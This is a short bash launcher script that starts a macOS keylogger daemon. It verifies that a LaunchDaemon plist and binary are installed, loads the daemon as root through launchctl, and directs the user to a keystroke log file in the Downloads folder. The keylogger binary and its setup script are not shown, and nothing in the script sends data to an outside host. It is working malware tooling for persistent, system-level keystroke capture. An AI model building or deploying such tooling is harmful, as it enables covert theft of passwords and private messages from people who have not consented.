#!/usr/bin/env bash
# start.sh — start the keylogger daemon
set -euo pipefail
PLIST=/Library/LaunchDaemons/com.ollie.keylog.plist
BIN=/usr/local/bin/keylog

if [ ! -f "$PLIST" ]; then
    echo "[!] not installed. Run: bash setup.sh"
    exit 1
fi
if [ ! -x "$BIN" ]; then
    echo "[!] binary missing. Run: bash setup.sh"
    exit 1
fi

echo "[*] loading daemon..."
sudo launchctl load "$PLIST" 2>/dev/null || sudo launchctl start com.ollie.keylog
sleep 0.5

if sudo launchctl list | grep -q com.ollie.keylog; then
    echo "[+] running. logs -> $HOME/Downloads/keylog.log"
    echo "    watch: tail -f $HOME/Downloads/keylog.log"
else
    echo "[!] failed to start. check: sudo launchctl list | grep keylog"
    echo "    (Input Monitoring permission may be missing — see setup.sh output)"
    exit 1
fi